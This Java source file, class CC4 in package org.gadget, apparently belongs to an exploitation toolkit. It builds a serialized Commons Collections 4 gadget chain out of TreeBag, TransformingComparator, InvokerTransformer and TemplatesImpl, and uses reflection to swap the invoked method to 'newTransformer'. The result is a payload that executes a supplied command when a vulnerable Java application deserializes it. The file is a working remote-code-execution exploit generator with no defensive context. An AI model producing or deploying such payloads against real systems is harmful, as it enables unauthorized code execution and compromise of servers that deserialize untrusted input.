package org.gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.util.TemplateUtils;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

public class CC4 {
    public static byte[] getBytes(String common) throws Exception {
        TemplatesImpl template = TemplateUtils.getTemplate(common);
        Constructor<InvokerTransformer> declaredConstructor = InvokerTransformer.class.getDeclaredConstructor(String.class);
        declaredConstructor.setAccessible(true);
        InvokerTransformer newTransformer = declaredConstructor.newInstance("toString");

        TransformingComparator tc = new TransformingComparator(newTransformer);
        TreeBag tb = new TreeBag(tc);
        tb.add(template);

        Field iMethodName = newTransformer.getClass().getDeclaredField("iMethodName");
        iMethodName.setAccessible(true);
        iMethodName.set(newTransformer,"newTransformer");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(tb);
        return byteArrayOutputStream.toByteArray();
    }
}
